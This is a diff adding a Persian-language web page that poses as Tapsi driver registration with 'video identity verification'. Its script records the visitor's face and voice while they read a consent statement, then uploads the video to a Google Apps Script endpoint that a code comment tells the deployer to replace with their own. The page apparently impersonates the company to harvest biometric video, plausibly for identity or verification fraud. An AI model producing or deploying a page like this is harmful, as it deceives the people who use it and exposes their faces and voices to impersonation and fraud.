@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="fa">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ثبت نام رانندگان تپسی</title>
+  <style>
+    body { font-family: Tahoma, sans-serif; text-align: center; background: #f4f4f9; padding: 15px; margin: 0; }
+    .container { max-width: 450px; margin: 0 auto; background: #fff; padding: 20px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+    .video-box { position: relative; width: 100%; background: #000; border-radius: 12px; overflow: hidden; min-height: 250px; }
+    video { width: 100%; display: block; }
+    .teleprompter { position: absolute; bottom: 10px; left: 10px; right: 10px; background: rgba(0,0,0,0.8); color: #fff; padding: 12px; border-radius: 8px; font-size: 13px; line-height: 1.6; }
+    .btn { padding: 12px 24px; margin: 15px 5px; font-size: 15px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; width: 80%; }
+    .btn-start { background: #ff5722; color: #fff; }
+    .btn-stop { background: #757575; color: #fff; }
+    .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+    #status { margin-top: 15px; font-weight: bold; color: #333; }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <h2>ثبت نام رانندگان تپسی</h2>
+    <h3>احراز هویت تصویری</h3>
+    <p>روی دکمه زیر کلیک کنید، اجازه دسترسی به دوربین را بدهید و متن پایین کادر را بخوانید.</p>
+
+    <div class="video-box">
+      <video id="video" autoplay muted playsinline></video>
+      <div class="teleprompter">
+        "اینجانب درخواست ثبت نام به عنوان راننده را دارم و صحت تمامی اطلاعات وارد شده را تایید می‌کنم."
+      </div>
+    </div>
+
+    <button id="startBtn" class="btn btn-start" onclick="startCamera()">🎥 شروع ضبط</button>
+    <button id="stopBtn" class="btn btn-stop" onclick="stopRecording()" disabled>⏹ پایان و ارسال</button>
+    
+    <p id="status"></p>
+  </div>
+
+  <script>
+    // آدرس Web App گوگل اسکریپت خود را بین دو کوتیشن پایین بگذارید
+    const WEB_APP_URL = "https://script.google.com/macros/s/AKfycby9NnKEghUufLyn1q8bpsZp0CfS33fVOZCKbny6LRqNlx715mETs__Pg2ZfOEEUJulY/exec"; 
+
+    let mediaRecorder, stream, recordedChunks = [];
+
+    async function startCamera() {
+      const status = document.getElementById('status');
+      try {
+        status.innerText = "در حال درخواست دسترسی به دوربین...";
+        
+        // درخواست مستقیم از مرورگر - کادر Allow ظاهر می‌شود
+        stream = await navigator.mediaDevices.getUserMedia({ 
+          video: { facingMode: "user" }, 
+          audio: true 
+        });
+        
+        document.getElementById('video').srcObject = stream;
+
+        let options = { mimeType: 'video/webm' };
+        if (!MediaRecorder.isTypeSupported('video/webm')) {
+          options = { mimeType: 'video/mp4' };
+        }
+
+        recordedChunks = [];
+        mediaRecorder = new MediaRecorder(stream, options);
+        mediaRecorder.ondataavailable = e => { if (e.data && e.data.size > 0) recordedChunks.push(e.data); };
+        mediaRecorder.onstop = uploadVideo;
+
+        mediaRecorder.start();
+        document.getElementById('startBtn').disabled = true;
+        document.getElementById('stopBtn').disabled = false;
+        status.innerText = "🔴 در حال ضبط... متن را بخوانید و سپس دکمه پایان را بزنید.";
+      } catch (err) {
+        console.error(err);
+        alert("خطا در دسترسی به دوربین: " + err.message);
+        status.innerText = "دسترسی به دوربین داده نشد.";
+      }
+    }
+
+    function stopRecording() {
+      if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+        mediaRecorder.stop();
+        if (stream) stream.getTracks().forEach(track => track.stop());
+        document.getElementById('startBtn').disabled = false;
+        document.getElementById('stopBtn').disabled = true;
+        document.getElementById('status').innerText = "در حال آماده‌سازی و ارسال ویدیو به سرور...";
+      }
+    }
+
+    function uploadVideo() {
+      const blob = new Blob(recordedChunks, { type: recordedChunks[0]?.type || 'video/webm' });
+      const reader = new FileReader();
+      reader.readAsDataURL(blob);
+      reader.onloadend = function() {
+        fetch(WEB_APP_URL, {
+          method: 'POST',
+          body: JSON.stringify({ video: reader.result })
+        })
+        .then(res => res.json())
+        .then(data => {
+          document.getElementById('status').innerText = data.message;
+        })
+        .catch(err => {
+          document.getElementById('status').innerText = "خطا در آپلود ویدیو!";
+        });
+      };
+    }
+  </script>
+</body>
+</html>
